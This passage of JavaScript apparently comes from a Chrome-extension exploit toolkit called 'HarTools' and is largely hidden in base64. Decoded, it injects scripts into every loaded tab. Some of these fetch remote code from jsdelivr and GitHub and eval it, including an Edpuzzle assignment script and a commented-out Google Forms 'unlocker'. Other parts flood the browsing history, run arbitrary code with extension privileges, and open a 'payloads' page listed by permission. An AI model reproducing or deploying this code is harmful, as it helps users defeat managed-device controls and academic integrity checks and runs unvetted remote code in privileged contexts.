CAgICAgICAgIkZsb29kaW5nIFN1Y2Nlc3NmdWwhXG4gIiArCiAgICAgICAgICAgICAgICB3aW5kb3cubG9jYXRpb24uaHJlZiArCiAgICAgICAgICAgICAgICAiIFxuSXMgTm93IEluIFlvdXIgSGlzdG9yeSAiICsKICAgICAgICAgICAgICAgIG51bSArCiAgICAgICAgICAgICAgICAobnVtID09IDEgPyAiIHRpbWUuIiA6ICIgVGltZXMuIikKICAgICAgICAgICAgKTsKICAgICAgICB9CiAgICB9OwoKICAgIGNvbnN0IFRhYkJ1dHRvbnMgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIjdGFicy1idXR0b25zIik7CgogICAgaWYgKGNocm9tZS50YWJzLmV4ZWN1dGVTY3JpcHQpIHsKCiAgICAgICAgZnVuY3Rpb24gbGlzdGVuZXJBcHAoY2FsbGJhY2spIHsKICAgICAgICAgICAgY29uc3QgZnVuYyA9IChpZCwgY2hhbmdlSW5mbykgPT4gewogICAgICAgICAgICAgICAgaWYgKGNoYW5nZUluZm8uc3RhdHVzID09PSAiY29tcGxldGUiKSB7CiAgICAgICAgICAgICAgICAgICAgY2hyb21lLnRhYnMuZ2V0KGlkLCAodGFiKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICh0YWIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhbGxiYWNrKHRhYik7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfTsKICAgICAgICAgICAgY2hyb21lLnRhYnMub25VcGRhdGVkLmFkZExpc3RlbmVyKGZ1bmMpOwogICAgICAgICAgICByZXR1cm4gZnVuYzsKICAgICAgICB9CgogICAgICAgIGNvbnN0IHNjcmlwdHMgPSB7fTsKICAgICAgICBjb25zdCBjb25kaXRpb25zID0ge307CiAgICAgICAgY29uc3QgbGlzdGVuZXJzID0ge307CgogICAgICAgIHNjcmlwdHMuZXJ1ZGEgPSBgCiAgICBmZXRjaCgiaHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L25wbS9lcnVkYSIpLnRoZW4ocmVzID0+IHJlcy50ZXh0KCkpLnRoZW4oKGRhdGEpID0+IHsKICAgICAgZXZhbChkYXRhKTsKICAgICAgaWYgKCF3aW5kb3cuZXJ1ZGFMb2FkZWQpIHsKICAgICAgICBlcnVkYS5pbml0KHsKICAgICAgICAgIGRlZmF1bHRzOiB7CiAgICAgICAgICAgIGRpc3BsYXlTaXplOiA0NSwKICAgICAgICAgICAgdGhlbWU6ICJBTU9MRUQiCiAgICAgICAgICB9CiAgICAgICAgfSk7CiAgICAgICAgd2luZG93LmVydWRhTG9hZGVkID0gdHJ1ZTsKICAgICAgfQogICAgfSk7CiAgYDsKCiAgICAgICAgc2NyaXB0cy5jaGlpID0gYAogICAgY29uc3Qgc2NyaXB0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CiAgICBzY3JpcHQuc3JjID0gJ2h0dHBzOi8vY2hpaS5saXJpbGlyaS5pby9wbGF5Z3JvdW5kL3RhcmdldC5qcyc7CiAgICBzY3JpcHQuc2V0QXR0cmlidXRlKCdlbWJlZGRlZCcsICd0cnVlJyk7CiAgICBkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKHNjcmlwdCk7CiAgYDsKCiAgICAgICAgc2NyaXB0cy5hZGJsb2NrID0gYAogICAgKGZ1bmN0aW9uKCl7CgogICAgICB2YXIgc2VsZWN0b3JzID0gWwoKICAgICAgJyNzaWRlYmFyLXdyYXAnLCAnI2FkdmVydCcsICcjeHJhaWwnLCAnI21pZGRsZS1hcnRpY2xlLWFkdmVydC1jb250YWluZXInLAogICAgICAnI3Nwb25zb3JlZC1yZWNvbW1lbmRhdGlvbnMnLCAnI2Fyb3VuZC10aGUtd2ViJywgJyNzcG9uc29yZWQtcmVjb21tZW5kYXRpb25zJywKICAgICAgJyN0YWJvb2xhLWNvbnRlbnQnLCAnI3RhYm9vbGEtYmVsb3ctdGFib29sYS1uYXRpdmUtdGh1bWJuYWlscycsICcjaW5hcnRpY2xlX3dyYXBwZXJfZGl2JywKICAgICAgJyNyYy1yb3ctY29udGFpbmVyJywgJyNhZHMnLCAnI2F0LXNoYXJlLWRvY2snLCAnI2F0NC1zaGFyZScsICcjYXQ0LWZvbGxvdycsICcjcmlnaHQtYWRzLXJhaWwnLAogICAgICAnZGl2I2FkLWludGVyc3RpdGlhbCcsICdkaXYjYWR2ZXJ0LWFydGljbGUnLCAnZGl2I2FjLWxyZS1wbGF5ZXItcGgnLAoKICAgICAgJy5hZCcsICcuYXZlcnQnLCAnLmF2ZXJ0X193cmFwcGVyJywgJy5taWRkbGUtYmFubmVyLWFkJywgJy5hZHZlcnRpc2VtZW50JywKICAgICAgJy5Hb29nbGVBY3RpdmVWaWV3Q2xhc3MnLCAnLmFkdmVydCcsICcuY25zLWFkcy1zdGFnZScsICcudGVhZHMtaW5yZWFkJywgJy5hZC1iYW5uZXInLAogICAgICAnLmFkLWFuY2hvcmVkJywgJy5qc19zaGVsZl9hZHMnLCAnLmFkLXNsb3QnLCAnLmFudGVubmEnLCAnLnhyYWlsLWNvbnRlbnQnLAogICAgICAnLmFkdmVydGlzZW1lbnRfX2xlYWRlcmJvYXJkJywgJy5hZC1sZWFkZXJib2FyZCcsICcudHJjX3Jib3hfb3V0ZXInLCAnLmtzLXJlY29tbWVuZGVkJywKICAgICAgJy5hcnRpY2xlLWRhJywgJ2Rpdi5zcG9uc29yZWQtc3Rvcmllcy1jb21wb25lbnQnLCAnZGl2LmFkZHRoaXMtc21hcnRsYXllcnMnLAogICAgICAnZGl2LmFydGljbGUtYWRzcG9uc29yJywgJ2Rpdi5zaWduaW4tcHJvbXB0JywgJ2Rpdi5hcnRpY2xlLWJ1bXBlcicsICdkaXYudmlkZW8tcGxhY2Vob2xkZXInLAogICAgICAnZGl2LnRvcC1hZC1jb250YWluZXInLCAnZGl2LmhlYWRlci1hZCcsICdkaXYuYWQtdW5pdCcsICdkaXYuZGVtby1ibG9jaycsICdkaXYuT1VUQlJBSU4nLAogICAgICAnZGl2Lm9iLXdpZGdldCcsICdkaXYubndzcm0td3JhcHBlcicsICdkaXYuYW5ub3VuY2VtZW50QmFyJywgJ2Rpdi5wYXJ0bmVyLXJlc291cmNlcy1ibG9jaycsCiAgICAgICdkaXYuYXJyb3ctZG93bicsICdkaXYubS1hZCcsICdkaXYuc3RvcnktaW50ZXJydXB0JywgJ2Rpdi50YWJvb2xhLXJlY29tbWVuZGVkJywKICAgICAgJ2Rpdi5hZC1jbHVzdGVyLWNvbnRhaW5lcicsICdkaXYuY3R4LXNpZGViYXInLCAnZGl2LmluY29nbml0by1tb2RhbCcsICcuT1VUQlJBSU4nLCAnLnN1YnNjcmliZS1idXR0b24nLAogICAgICAnLmFkczknLCAnLmxlYWRlcmJvYXJkcycsICcuR29vZ2xlQWN0aXZlVmlld0VsZW1lbnQnLCAnLm1wdS1jb250YWluZXInLCAnLmFkLTMwMHg2MDAnLCAnLnRmLWFkLWJsb2NrJywKICAgICAgJy5zaWRlYmFyLWFkcy1ob2xkZXItdG9wJywgJy5hZHMtb25lJywgJy5GdWxsUGFnZU1vZGFsX19zY3JvbGxlcicsCiAgICAgICcuY29udGVudC1hZHMtaG9sZGVyJywgJy53aWRnZXQtYXJlYScsICcuc29jaWFsLWJ1dHRvbnMnLCAnLmFjLXBsYXllci1waCcsCgogICAgICAnYXNpZGUjc3BvbnNvcmVkLXJlY29tbWVuZGF0aW9ucycsICdhc2lkZVtyb2xlPSJiYW5uZXIiXScsICdhc2lkZScsCiAgICAgICdhbXAtYWQnLCAnc3BhbltpZF49YWRfaXNfXScsICdkaXZbY2xhc3MqPSJpbmRpYW5hcG9saXMtb3B0aW4iXScsICdkaXZbaWRePWdvb2dsZV9hZHNfaWZyYW1lXScsCiAgICAgICdkaXZbZGF0YS1nb29nbGUtcXVlcnktaWRdJywgJ3NlY3Rpb25bZGF0YS1yZXNwb25zZV0nLCAnaW5zLmFkc2J5Z29vZ2xlJywgJ2RpdltkYXRhLWdvb2dsZS1xdWVyeS1pZF0nLAogICAgICAnZGl2W2RhdGEtdGVzdC1pZD0iZnVsbFBhZ2VTaWdudXBNb2RhbCJdJywgJ2RpdltkYXRhLXRlc3QtaWQ9ImdpZnRXcmFwIl0nIF07CiAgICAgIGZvcihsZXQgaSBpbiBzZWxlY3RvcnMpIHsKICAgICAgICAgIGxldCBub2Rlc0xpc3QgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKHNlbGVjdG9yc1tpXSk7CiAgICAgICAgICBmb3IobGV0IGkgPSAwOyBpIDwgbm9kZXNMaXN0Lmxlbmd0aDsgaSsrKSB7CiAgICAgICAgICAgICAgbGV0IGVsID0gbm9kZXNMaXN0W2ldOwogICAgICAgICAgICAgIGlmKGVsICYmIGVsLnBhcmVudE5vZGUpCiAgICAgICAgICAgICAgZWwucGFyZW50Tm9kZS5yZW1vdmVDaGlsZChlbCk7CiAgICAgICAgICB9CiAgICAgIH0KICAgIH0pKCk7CiAgYDsKICAvKnNjcmlwdHMuZ2xvY2tlZCA9IGAKZmV0Y2goImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS94TmFzdW5pL2dvb2dsZS1mb3Jtcy11bmxvY2tlci9yZWZzL2hlYWRzL21haW4vc2NyaXB0LmpzIikKICAudGhlbihyZXNwb25zZSA9PiB7CiAgICBpZiAoIXJlc3BvbnNlLm9rKSB7CiAgICAgIHRocm93IG5ldyBFcnJvcigiTmV0d29yayByZXNwb25zZSB3YXMgbm90IG9rIik7CiAgICB9CiAgICByZXR1cm4gcmVzcG9uc2UudGV4dCgpOwogIH0pCiAgLnRoZW4oc2NyaXB0Q29udGVudCA9PiB7CiAgICBpZiAoIXdpbmRvdy5za2liTG9hZGVkKSB7CiAgICAgIGV2YWwoc2NyaXB0Q29udGVudCk7CiAgICAgIHdpbmRvdy5za2liTG9hZGVkID0gdHJ1ZTsKICAgIH0KICB9KQogIC5jYXRjaChlcnJvciA9PiBhbGVydCgiRXJyb3IgbG9hZGluZyBzY3JpcHQ6IiwgZXJyb3IpKTsKYDsKKi8KICAgICAgICBzY3JpcHRzLmVkcHV6emxlID0gYAogICAgZmV0Y2goImh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC9NaW5lcjQ5dXIvc2hvcnRoYW5kQG1haW4vZWRwdXp6bGluZ3NjcmlwdC5qcyIpLnRoZW4ociA9PiByLnRleHQoKSkudGhlbihyID0+IHsKICAgICAgaWYgKCF3aW5kb3cuZWRwdXp6bGVzTG9hZGVkKSB7CiAgICAgICAgZXZhbChyKTsKICAgICAgICB3aW5kb3cuZWRwdXp6bGVzTG9hZGVkID0gdHJ1ZTsKICAgICAgfQogICAgfSk7CiAgYDsKICAgICAgICBjb25kaXRpb25zLmVkcHV6emxlID0gKHRhYikgPT4gdGFiLnVybC5tYXRjaCgvZWRwdXp6bGVcLmNvbVwvYXNzaWdubWVudHMvZyk7CiAgICAgICAgLy8gY29uZGl0aW9ucy5nbG9ja2VkID0gKHRhYikgPT4gdGFiLnVybC5tYXRjaCgvaHR0cHM/OlwvXC9kb2NzXC5nb29nbGVcLmNvbVwvZm9ybXNcLy9nKTsKICAgICAgICBjb25zdCBUb2dnbGVCdXR0b25zID0gVGFiQnV0dG9ucy5xdWVyeVNlbGVjdG9yKCIjdG9nZ2xlYWJsZS1idXR0b25zIik7CgogICAgICAgIFRvZ2dsZUJ1dHRvbnMucXVlcnlTZWxlY3RvckFsbCgiYnV0dG9uIikuZm9yRWFjaCgKICAgICAgICAgICAgKGIpID0+CiAgICAgICAgICAgIChiLm9uY2xpY2sgPSAoKSA9PiB7CiAgICAgICAgICAgICAgICBjb25zdCBpZCA9IGIuaWQ7CgogICAgICAgICAgICAgICAgaWYgKGIuaGFzQXR0cmlidXRlKCJ0b2dnbGVkIikpIHsKCiAgICAgICAgICAgICAgICAgICAgaWYgKGlkIGluIGxpc3RlbmVycykKICAgICAgICAgICAgICAgICAgICAgICAgY2hyb21lLnRhYnMub25VcGRhdGVkLnJlbW92ZUxpc3RlbmVyKGxpc3RlbmVyc1tpZF0pOwogICAgICAgICAgICAgICAgICAgIGIucmVtb3ZlQXR0cmlidXRlKCJ0b2dnbGVkIik7CiAgICAgICAgICAgICAgICB9IGVsc2UgewoKICAgICAgICAgICAgICAgICAgICBjb25zdCBzY3JpcHQgPSBzY3JpcHRzW2lkXSB8fCAiIjsKICAgICAgICAgICAgICAgICAgICBjb25zdCBjb25kaXRpb24gPSBjb25kaXRpb25zW2lkXSB8fCAoKHRhYikgPT4gdHJ1ZSk7CiAgICAgICAgICAgICAgICAgICAgY29uc3QgZnVuYyA9IGxpc3RlbmVyQXBwKCh0YWIpID0+IHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGNvbmRpdGlvbih0YWIpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHJvbWUudGFicy5leGVjdXRlU2NyaXB0KHRhYi5pZCwgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvZGU6IHNjcmlwdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9KTsKCiAgICAgICAgICAgICAgICAgICAgbGlzdGVuZXJzW2lkXSA9IGZ1bmM7CgogICAgICAgICAgICAgICAgICAgIGIuc2V0QXR0cmlidXRlKCJ0b2dnbGVkIiwgInRydWUiKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSkKICAgICAgICApOwogICAgfSBlbHNlIHsKICAgICAgICBUYWJCdXR0b25zLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICB9CgogICAgZG9jdW1lbnQKICAgICAgICAucXVlcnlTZWxlY3RvcigiI2NvZGUtcnVuIikKICAgICAgICAuYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCAoKSA9PiBydW5Db2RlKGZhbHNlKSk7Cn07Cgpjb25zdCBydW5Db2RlID0gYXN5bmMgKG9uVGFiLCB0YWJJZCA9ICIiKSA9PiB7CiAgICBjb25zdCBjb2RlVGV4dGFyZWEgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIjY29kZSIpOwogICAgbGV0IGNvZGUgPSBjb2RlVGV4dGFyZWEudmFsdWUudHJpbSgpOwoKICAgIGNvbnN0IG91dHB1dERpdiA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIiNjb2RlLW91dHB1dCIpOwoKICAgIGlmIChjb2RlLnRvTG93ZXJDYXNlKCkgPT09ICJwcmFoaXQiKSB7CgogICAgICAgIGNvbnN0IGNvbnRhaW5lciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogICAgICAgIGNvbnRhaW5lci5jbGFzc05hbWUgPSAicHJhaGl0LWNvbnRhaW5lciI7CgogICAgICAgIGNvbnN0IG92ZXJsYXlJbWFnZSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImltZyIpOwogICAgICAgIG92ZXJsYXlJbWFnZS5zcmMgPQogICAgICAgICAgICAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3QzbTFuNGwvcmlndG9vbHMtdXBkYXRlZC11aS9yZWZzL2hlYWRzL21haW4vaW1nL3ByYWhpdC5wbmciOwogICAgICAgIG92ZXJsYXlJbWFnZS5hbHQgPSAiUHJhaGl0IEltYWdlIjsKICAgICAgICBvdmVybGF5SW1hZ2UuY2xhc3NOYW1lID0gInByYWhpdC1pbWFnZSI7CgogICAgICAgIGNvbnN0IHRleHRCb3ggPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgICAgICB0ZXh0Qm94LnRleHRDb250ZW50ID0gIlwiSSBtYWRlIG15IG93biBvaWwgcmlnZ2luZyBzdG9jayBtYXJrZXQgdG9vbHMuXCIiOwogICAgICAgIHRleHRCb3guY2xhc3NOYW1lID0gInByYWhpdC10ZXh0Ym94IjsKCiAgICAgICAgY29udGFpbmVyLmFwcGVuZENoaWxkKG92ZXJsYXlJbWFnZSk7CiAgICAgICAgY29udGFpbmVyLmFwcGVuZENoaWxkKHRleHRCb3gpOwoKICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGNvbnRhaW5lcik7CgogICAgICAgIGNvbnN0IHNub3dmbGFrZXNEaXYgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgICAgICBzbm93Zmxha2VzRGl2LmNsYXNzTmFtZSA9ICJzbm93Zmxha2VzIjsKICAgICAgICBzbm93Zmxha2VzRGl2LnNldEF0dHJpYnV0ZSgiYXJpYS1oaWRkZW4iLCAidHJ1ZSIpOwoKICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IDE0OyBpKyspIHsKICAgICAgICAgICAgY29uc3Qgc25vd2ZsYWtlID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgICAgICAgICAgIHNub3dmbGFrZS5jbGFzc05hbWUgPSAic25vd2ZsYWtlIjsKCiAgICAgICAgICAgIGNvbnN0IHNub3dmbGFrZUltYWdlID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW1nIik7CiAgICAgICAgICAgIHNub3dmbGFrZUltYWdlLndpZHRoID0gMzA7CiAgICAgICAgICAgIHNub3dmbGFrZUltYWdlLnNyYyA9ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vdDNtMW40bC9yaWd0b29scy11cGRhdGVkLXVpL3JlZnMvaGVhZHMvbWFpbi9pbWcvcHJhaGl0LnBuZyI7CiAgICAgICAgICAgIHNub3dmbGFrZS5hcHBlbmRDaGlsZChzbm93Zmxha2VJbWFnZSk7CgogICAgICAgICAgICBzbm93Zmxha2VzRGl2LmFwcGVuZENoaWxkKHNub3dmbGFrZSk7CiAgICAgICAgfQoKICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHNub3dmbGFrZXNEaXYpOwoKICAgICAgICBjb25zdCBleHBsb3Npb25JbWFnZSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImltZyIpOwogICAgICAgIGV4cGxvc2lvbkltYWdlLnNyYyA9ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vdDNtMW40bC9yaWd0b29scy11cGRhdGVkLXVpL3JlZnMvaGVhZHMvbWFpbi9pbWcvYm9vbS5hd2VicCI7CiAgICAgICAgZXhwbG9zaW9uSW1hZ2Uuc3R5bGUucG9zaXRpb24gPSAiZml4ZWQiOwogICAgICAgIGV4cGxvc2lvbkltYWdlLnN0eWxlLnRvcCA9ICIwIjsKICAgICAgICBleHBsb3Npb25JbWFnZS5zdHlsZS5sZWZ0ID0gIjAiOwogICAgICAgIGV4cGxvc2lvbkltYWdlLnN0eWxlLndpZHRoID0gIjEwMCUiOwogICAgICAgIGV4cGxvc2lvbkltYWdlLnN0eWxlLmhlaWdodCA9ICIxMDAlIjsKICAgICAgICBleHBsb3Npb25JbWFnZS5zdHlsZS56SW5kZXggPSAiOTk5OSI7CiAgICAgICAgZXhwbG9zaW9uSW1hZ2Uuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGV4cGxvc2lvbkltYWdlKTsKCiAgICAgICAgY29uc3QgZXhwbG9kZSA9IG5ldyBBdWRpbygiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3QzbTFuNGwvcmlndG9vbHMtdXBkYXRlZC11aS9yZWZzL2hlYWRzL21haW4vaW1nL2Jvb20ubXAzIik7CgogICAgICAgIGNvbnN0IGNhdHNNdXNpYyA9IG5ldyBBdWRpbygiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3QzbTFuNGwvcmlndG9vbHMtdXBkYXRlZC11aS9yZWZzL2hlYWRzL21haW4vaW1nL2NhdHMubXAzIik7CiAgICAgICAgY2F0c011c2ljLmxvb3AgPSB0cnVlOwoKICAgICAgICBmdW5jdGlvbiBzaG93RXhwbG9zaW9uQW5kUGxheU11c2ljKCkgewoKICAgICAgICAgICAgZXhwbG9zaW9uSW1hZ2Uuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7CgogICAgICAgICAgICBleHBsb2RlLnBsYXkoKTsKICAgICAgICAgICAgY2F0c011c2ljLnBsYXkoKTsKCiAgICAgICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICBleHBsb3Npb25JbWFnZS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOwogICAgICAgICAgICB9LCAxNTAwKTsKCiAgICAgICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICBleHBsb2RlLnBhdXNlKCk7CiAgICAgICAgICAgICAgICBleHBsb2RlLmN1cnJlbnRUaW1lID0gMDsKICAgICAgICAgICAgfSwgMTUwMCk7CiAgICAgICAgfQoKICAgICAgICBzaG93RXhwbG9zaW9uQW5kUGxheU11c2ljKCk7CgogICAgICAgIHJldHVybjsKICAgIH0KCiAgICBpZiAob25UYWIpIHsKICAgICAgICBjb2RlID0gY2hyb21lLnRhYnMuZXhlY3V0ZVNjcmlwdCA/CiAgICAgICAgICAgIGA7Y2hyb21lLnRhYnMuZXhlY3V0ZVNjcmlwdCgKICAgICAgICAgICR7dGFiSWR9LAogICAgICAgICAgeyBjb2RlOiAke0pTT04uc3RyaW5naWZ5KGNvZGUpfSB9CiAgICAgICAgKWAgOgogICAgICAgICAgICBjaHJvbWUuc2NyaXB0aW5nID8KICAgICAgICAgICAgYGNocm9tZS5zY3JpcHRpbmcuZXhlY3V0ZVNjcmlwdCh7CiAgICAgICAgICB0YXJnZXQ6IHt0YWJJZDogJHt0YWJJZH19LAogICAgICAgICAgZnVuYzogKCkgPT4geyR7Y29kZX19CiAgICAgICAgfSk7YCA6CiAgICAgICAgICAgIGBhbGVydCgic29tZXRoaW5nIHdlbnQgd3JvbmcsIHJ1bkNvZGUgd2FzIGV4ZWN1dGVkIG9uIGEgdGFiIHdpdGhvdXQgcHJvcGVyIHBlcm1pc3Npb25zIilgOwogICAgfQoKICAgIHRyeSB7CiAgICAgICAgY29uc3Qgb3JpZ2luYWxMb2cgPSBjb25zb2xlLmxvZzsKICAgICAgICBjb25zb2xlLmxvZyA9ICguLi5hcmdzKSA9PiB7CiAgICAgICAgICAgIG91dHB1dERpdi5pbm5lckhUTUwgKz0gYXJncy5qb2luKCIgIikgKyAiPGJyPiI7CiAgICAgICAgfTsKCiAgICAgICAgY29uc3QgZnMgPSBhd2FpdCBEZWZhdWx0RXh0ZW5zaW9uQ2FwYWJpbGl0aWVzLmdldEZTKCk7CgogICAgICAgIGZ1bmN0aW9uIHdyaXRlRmlsZShmaWxlLCBkYXRhKSB7CiAgICAgICAgICAgIHJldHVybiBuZXcgUHJvbWlzZSgocmVzb2x2ZSwgcmVqZWN0KSA9PiB7CiAgICAgICAgICAgICAgICBmcy5yb290LmdldEZpbGUoZmlsZSwgewogICAgICAgICAgICAgICAgICAgIGNyZWF0ZTogdHJ1ZQogICAgICAgICAgICAgICAgfSwgZnVuY3Rpb24oZW50cnkpIHsKICAgICAgICAgICAgICAgICAgICBlbnRyeS5yZW1vdmUoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGZzLnJvb3QuZ2V0RmlsZShmaWxlLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjcmVhdGU6IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgfSwgZnVuY3Rpb24oZW50cnkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVudHJ5LmNyZWF0ZVdyaXRlcihmdW5jdGlvbih3cml0ZXIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3cml0ZXIud3JpdGUobmV3IEJsb2IoW2RhdGFdKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd3JpdGVyLm9ud3JpdGVlbmQgPSByZXNvbHZlLmJpbmQobnVsbCwgZW50cnkudG9VUkwoKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgfSk7CiAgICAgICAgfQoKICAgICAgICBjb25zdCB1cmwgPSBhd2FpdCB3cml0ZUZpbGUoInNyYy5qcyIsIGNvZGUpOwogICAgICAgIGxldCBzY3JpcHQgPQogICAgICAgICAgICBkb2N1bWVudC5ib2R5LnF1ZXJ5U2VsZWN0b3IoIiNldmFsdWF0ZV9lbGVtIikgPz8KICAgICAgICAgICAgZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7CiAgICAgICAgc2NyaXB0LnJlbW92ZSgpOwogICAgICAgIHNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpOwogICAgICAgIHNjcmlwdC5pZCA9ICJldmFsdWF0ZV9lbGVtIjsKICAgICAgICBzY3JpcHQuc3JjID0gdXJsOwogICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoc2NyaXB0KTsKCiAgICAgICAgY29uc29sZS5sb2cgPSBvcmlnaW5hbExvZzsKICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgb3V0cHV0RGl2LmlubmVySFRNTCA9IGBFcnJvcjogJHtlcnJvcn1gOwogICAgfQp9Ow==`))
                    const url = await writeFile('index.html', `${atob('PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KCjxoZWFkPgogIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgPHRpdGxlPkV4dGVuc2lvbiBFdmFsdWF0aW9uIC0gSGFyVG9vbHM8L3RpdGxlPgo8L2hlYWQ+Cgo8Ym9keT4KICA8ZGl2IGlkPSJwYXJ0aWNsZXMtanMiPjwvZGl2PgogIDxkaXYgY2xhc3M9Im1haW4iPgogICAgPGgxPk5vIHBheWxvYWRzIGFyZSBhdmFpbGFibGU8L2gxPgogICAgPHA+Tm8gcGF5bG9hZHMgY3VycmVudGx5IGF2YWlsYWJsZSBmb3IgeW91ciBleHRlbnNpb24uIFRyeSBhbm90aGVyIGV4dGVuc2lvbi4KICAgICAgV2UgYXJlIGN1cnJlbnRseSBkZXZlbG9waW5nIHBheWxvYWRzIGZvciBvdGhlciBBUElzLjwvcD4KICAgIDxwPkF2YWlsYWJsZSBwYXlsb2FkcyBmb3IgcGVybWlzc2lvbnM6PC9wPgogICAgPHVsPgogICAgICA8bGk+bWFuYWdlbWVudDwvbGk+CiAgICA8L3VsPgogIDwvZGl2PgogIAogIDxzdHlsZT4KICAgIGJvZHkgewogICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMWUyMDMwOwogICAgICBjb2xvcjogd2hpdGU7CiAgICAgIGZvbnQtZmFtaWx5OiBBcmlhbCwgSGVsdmV0aWNhLCBzYW5zLXNlcmlmOwogICAgICBvdmVyZmxvdzogaGlkZGVuOwogICAgfQoKICAgIGEgewogICAgICBjb2xvcjogI2I3YmRmODsKICAgIH0KCiAgICAubWFpbiB7CiAgICAgIHRvcDogNTAlOwogICAgICBsZWZ0OiA1MCU7CiAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICAgICAgdHJhbnNmb3JtOiB0cmFuc2xhdGUoLTUwJSwgLTUwJSk7CiAgICAgIGJvcmRlcjogM3B4IHNvbGlkIHdoaXRlOwogICAgICBmb250LXdlaWdodDogYm9sZDsKICAgICAgcGFkZGluZzogNSU7CiAgICAgIGJvcmRlci1yYWRpdXM6IDEwcHg7CiAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzI0MjczYTsKICAgIH0KCiAgICAuYnV0dG9uIHsKICAgICAgYmFja2dyb3VuZC1jb2xvcjogI2E2ZGE5NTsKICAgICAgYm9yZGVyOiBub25lOwogICAgICBjb2xvcjogd2hpdGU7CiAgICAgIHBhZGRpbmc6IDEwcHggMjBweDsKICAgICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgICB0ZXh0LWRlY29yYXRpb246IG5vbmU7CiAgICAgIGRpc3BsYXk6IGlubGluZS1ibG9jazsKICAgICAgZm9udC1zaXplOiAxNHB4OwogICAgICBtYXJnaW46IDRweCAycHg7CiAgICAgIGN1cnNvcjogcG9pbnRlcjsKICAgICAgYm9yZGVyLXJhZGl1czogNXB4OwogICAgfQoKICAgIHVsIHsKICAgICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgICBtYXJnaW46IDA7CiAgICAgIHBhZGRpbmc6IDA7CiAgICAgIGRpc3BsYXk6IGZsZXg7CiAgICAgIGp1c3RpZnktY29udGVudDogY2VudGVyOwogICAgICBhbGlnbi1pdGVtczogY2VudGVyOwogICAgfQogIDwvc3R5bGU+CjwvYm9keT4KCjwvaHRtbD4=')}<script src="./index.js" ></script>`);
                    w.chrome.tabs.create({ url });
                    w.close();
                    cleanup();
                });


